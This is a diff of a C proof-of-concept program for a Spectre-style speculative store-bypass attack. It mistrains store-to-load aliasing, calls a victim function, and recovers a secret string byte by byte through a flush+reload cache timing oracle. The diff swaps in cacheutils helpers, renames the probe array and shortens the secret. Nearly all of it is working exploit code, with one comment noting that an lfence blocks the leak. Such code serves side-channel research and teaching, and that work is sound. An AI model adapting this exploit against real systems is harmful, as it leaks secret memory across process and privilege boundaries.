@@ -10,7 +10,7 @@
 #include <stdlib.h>
 #include <stdint.h>
 
-#include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
+// #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
 
 #include <unistd.h>
 #include <sys/mman.h>
@@ -18,7 +18,11 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 
-#include <sched.h>
+#include "cacheutils.h"
+#define PAGE_SIZE 4096
+
+#define NUM_PAGES 1024
+#define NUM_BAGS (PAGE_SIZE/(sizeof(int32_t)))
 
 /********************************************************************
 Victim code.
@@ -27,14 +31,12 @@ unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint32_t array1[16] = { 0xb0, 0xb1, 0xb2, 0xb3, 0xb4, 0xb5, 0xb6, 0xb7, 0xb8, 0xb9, 0xba, 0xbb, 0xbc, 0xbd, 0xbe, 0xbf };
 uint8_t unused2[64];
-uint8_t array2[256 * 512];
-int32_t big_block[4096];
-#define NUM_PAGES 1024
+uint8_t oracle[256 * PAGE_SIZE];
+int32_t big_block[PAGE_SIZE];
 volatile int32_t* load_addrs[NUM_PAGES];
-#define NUM_BAGS (4096/(sizeof(int32_t)))
 volatile int32_t store_addrs[NUM_BAGS];
 
-const uint32_t secret[] = {'T', 'h', 'e', ' ', 'M', 'a', 'g', 'i', 'c', ' ', 'W', 'o', 'r', 'd', 's', ' ', 'a', 'r', 'e', ' ', 'S', 'q', 'u', 'e', 'a', 'm', 'i', 's', 'h', ' ', 'O', 's', 's', 'i', 'f', 'r', 'a', 'g', 'e', '.' };
+const uint32_t secret[] = {'S', 'E', 'C', 'R', 'E', 'T'};
 
 uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
 
@@ -46,8 +48,14 @@ uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
 void victim_function(size_t x, register volatile int32_t* store_addr, register volatile int32_t* load_addr) {
  // printf("store_addr: %p load_addr: %p    x: %p   malicious pass: %p   \n", store_addr, load_addr, x, mal);
 
-  *store_addr = array1[x]+1;
-  temp &= array2[(*(load_addr)-1) * 512];
+  *store_addr = array1[x];
+  // placing an lfence here after the store prevents the vulnerability
+//          alias_p = (int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias)));
+  // if (load_addr == store_addr) 
+  //   asm volatile("lfence");
+
+ temp &= oracle[(*(load_addr)) * PAGE_SIZE];
+ //  temp &= oracle[(*((int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias))))-1) * PAGE_SIZE];
 }
 
 
@@ -56,7 +64,7 @@ Analysis code
 ********************************************************************/
 
 /* Find accessed cache lines corresponding to ASCII values */
-void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int results[256], int pagenum, int dropnum) {
+void readMemoryByte(size_t malicious_x, int results[256], int pagenum, int dropnum) {
   int tries, i, j, k, mix_i;
   unsigned int junk = 0;
   size_t training_x, x;
@@ -64,37 +72,42 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int results[256
   volatile uint8_t * addr;
 
   for (i = 0; i < 256; i++)
+    flush(oracle + i * PAGE_SIZE);
+    
+  for (i = 0; i < 256; i++)
     results[i] = 0;
+
   for (tries = 1999; tries > 0; tries--) {
 
-    /* Flush array2[256*(0..255)] from cache */
-    for (i = 0; i < 256; i++)
-      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
-
+    /* Flush oracle[256*(0..255)] from cache */
+  
     training_x = tries % array1_size;
-    uint64_t training_alias = (uint64_t)&store_addrs[dropnum];
-    uint64_t malicious_alias = (uint64_t)load_addrs[pagenum];
     uint64_t training_store = (uint64_t)&store_addrs[dropnum];
+    uint64_t training_alias = (uint64_t)&store_addrs[dropnum];
     uint64_t malicious_store = (uint64_t)&store_addrs[dropnum+1];
+    uint64_t malicious_alias = (uint64_t)load_addrs[pagenum];
     int32_t* alias_p;
     int32_t* alias_q;
-    for (int k = 0; k < 500; k++) {
-      for (j = 25-1; j >= 0; j--) {
+    for (int k = 0; k < 10; k++) {
+      for (j = 24; j >= 0; j--) {
         /* Bit twiddling to set x=training_x if j%25!=0 or malicious_x if j%25==0 */
         /* Avoid jumps in case those tip off the branch predictor */
         x = (j - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%25==0, else x=0 */
         x = (x | (x >> 16)); /* Set x=-1 if j&25=0, else x=0 */
+
         // set alias_p to truly alias the store_addr if j%25!=0,
         // and NOT alias the store_addr if j%25==0
         alias_p = (int32_t*)(training_alias ^ (x & (malicious_alias ^ training_alias)));
         alias_q = (int32_t*)(training_store ^ (x & (malicious_store ^ training_store)));
+        // printf("%p, %p, %p\n", &store_addrs[dropnum], load_addrs[pagenum], alias_p);
         x = training_x ^ (x & (malicious_x ^ training_x));
+        // printf("%lx\n", x);
 
-        _mm_clflush( (int32_t*)malicious_alias);
+        flush( (int32_t*)malicious_alias);
 
         /* Delay */
         for (volatile int z = 0; z < 400; z++) {}
-        _mm_lfence();
+        mfence();
 
         /* Call the victim! */
         victim_function(x, alias_q, alias_p);
@@ -104,21 +117,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int results[256
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
-      addr = & array2[mix_i * 512];
-
-    /*
-    We need to accurately measure the memory access to the current index of the
-    array so we can determine which index was cached by the malicious mispredicted code.
-
-    The best way to do this is to use the rdtscp instruction, which measures current
-    processor ticks, and is also serialized.
-    */
-
-      time1 = __rdtscp( & junk); /* READ TIMER */
-      junk = * addr; /* MEMORY ACCESS TO TIME */
-      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-
-      if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
+      if(flush_reload(oracle + mix_i * PAGE_SIZE))
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
 
@@ -155,37 +154,27 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, int results[256
 */
 int main(int argc,
   const char * * argv) {
-
-  /* Set CPU affinity */
-  cpu_set_t cpus;
-  CPU_ZERO(&cpus);
-  CPU_SET(0, &cpus);
-  sched_setaffinity(0, sizeof(cpus), &cpus);
   
   /* Default to a cache hit threshold of 80 */
-  int cache_hit_threshold = 80;
+  CACHE_MISS = detect_flush_reload_threshold();
+  printf("CACHE_MISS Threshold %lu\n,", CACHE_MISS);
 
   /* Default for malicious_x is the secret string address */
   size_t malicious_x = (size_t)(secret -  array1);
   
   /* Default addresses to read is 40 (which is the length of the secret string) */
-  int len = 40;
+  int len = sizeof(secret)/ sizeof(int32_t);
   
   int i;
 
-  #ifdef NOCLFLUSH
-  for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
-    cache_flush_array[i] = 1;
-  }
-  #endif
 
   int fd = open("mmap", O_CREAT | O_TRUNC | O_RDWR, S_IRUSR | S_IWUSR);
   if (fd < 1) {
     perror(NULL);
     exit(1);
   }
-  ftruncate(fd, 0x1000 * NUM_PAGES);
-  int32_t* mmap_base = mmap(NULL, 0x1000 * NUM_PAGES, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+  ftruncate(fd, PAGE_SIZE * NUM_PAGES);
+  int32_t* mmap_base = mmap(NULL, PAGE_SIZE * NUM_PAGES, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 
   // arbitrarily chosen
   int dropnum = 33;
@@ -193,7 +182,7 @@ int main(int argc,
   uint64_t alias_base = (uint64_t)mmap_base;
   // touch all the pages
   for (i = 0; i < NUM_PAGES; i++) {
-    load_addrs[i] = (int32_t*)((((uint64_t)&store_addrs[dropnum]) & 0xfff) + (alias_base + i * 0x1000));
+    load_addrs[i] = (int32_t*)((((uint64_t)&store_addrs[dropnum]) & 0xfff) + (alias_base + i * PAGE_SIZE));
     *(load_addrs[i]) = 0xDD;
   }
 
@@ -209,25 +198,10 @@ int main(int argc,
   // touch the chosen page again just to be sure
   *(load_addrs[pagenum]) = 0xCC;
 
-  for (i = 0; i < (int)sizeof(array2); i++) {
-    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
+  for (i = 0; i < (int)sizeof(oracle); i++) {
+    oracle[i] = 1; /* write to oracle so in RAM not copy-on-write zero pages */
   }
 
-  /* Parse the cache_hit_threshold from the first command line argument.
-     (OPTIONAL) */
-  if (argc >= 2) {
-    sscanf(argv[1], "%d", &cache_hit_threshold);
-  }
-
-  /* Print git commit hash */
-  #ifdef GIT_COMMIT_HASH
-    printf("Version: commit " GIT_COMMIT_HASH "\n");
-  #endif
-  
-  /* Print cache hit threshold */
-  printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);
-
-  printf("\n");
 
   int results[256];
 
@@ -244,7 +218,7 @@ int main(int argc,
          the number of detected hits.
        Any detected ASCII characters are printed between the >< arrows.
     */
-    readMemoryByte(cache_hit_threshold, malicious_x++, results, pagenum, dropnum);
+    readMemoryByte(malicious_x++, results, pagenum, dropnum);
 
     i++;
     printf("\n");
